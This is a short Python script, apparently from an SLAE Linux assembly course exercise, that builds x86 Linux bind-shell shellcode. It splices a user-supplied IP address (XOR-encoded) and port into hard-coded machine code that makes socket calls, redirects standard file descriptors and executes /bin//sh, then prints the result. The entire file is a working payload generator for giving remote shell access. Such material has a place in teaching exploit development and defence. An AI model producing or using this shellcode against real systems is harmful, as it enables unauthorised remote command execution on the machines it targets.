########################################
# Filename: Bind-Shell-Creator.py
# Author  : Andrea Perfetti
# SLAE ID : SLAE - 1547
#:::::::::::::::::::::::::::::::::::::::
# USAGE
# Invoke the script adding ip address and port number as arguments
########################################

import socket
import sys

shellcode_part1 = '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x89\\xe2\\x50\\x50\\xb8'
shellcode_part2 = '\\x83\\xf0\\xff\\x50\\x31\\xc0\\x66\\x68'
shellcode_part3 = '\\x66\\x6a\\x02\\x66\\xb8\\x6a\\x01\\x89\\xfb\\x89\\xe1\\x29\\xca\\xcd\\x80\\x85\\xc0\\x75\\x30\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x31\\xdb\\x40\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x40\\xcd\\x80'



if len(sys.argv) < 3:
    print ('Usage: python3 {utility} [ip_address] [port_to_bind]'.format(utility = sys.argv[0]))
    exit(1)


ip = sys.argv[1]
ip_split = ip.split('.')
ip_string = '\\x{b1}\\x{b2}\\x{b3}\\x{b4}'.format( \
	b1 = format((int(ip_split[0]) ^ 255), '02x'), \
	b2 = format((int(ip_split[1]) ^ 255), '02x'), \
	b3 = format((int(ip_split[2]) ^ 255), '02x'), \
	b4 = format((int(ip_split[3]) ^ 255), '02x'), \
	)

port = int(sys.argv[2])
port = hex(socket.htons(port))
port_string = '\\x{b1}\\x{b2}'.format(b1 = port[4:6], b2 = port[2:4])


shellcode = shellcode_part1 + ip_string + shellcode_part2 + port_string + shellcode_part3


print ('IP Addr: {p}  --> {h}'.format(p=ip, h = ip_string))
print ('Port   : {p}  --> {h}'.format(p=port, h = port_string))
print ("\nShellcode:")
print (shellcode)